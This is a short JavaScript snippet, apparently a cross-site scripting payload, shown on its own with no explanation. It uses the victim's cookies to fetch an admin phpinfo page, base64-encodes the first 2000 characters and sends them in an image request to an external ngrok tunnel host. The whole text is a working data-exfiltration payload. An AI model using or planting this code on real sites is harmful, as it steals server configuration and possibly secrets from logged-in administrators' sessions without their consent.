fetch('/admin/phpinfo.php', {credentials:'include'})
.then(r=>r.text())
.then(d=>{
    d = d.slice(0,2000);
    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?d="+encodeURIComponent(btoa(d));
});
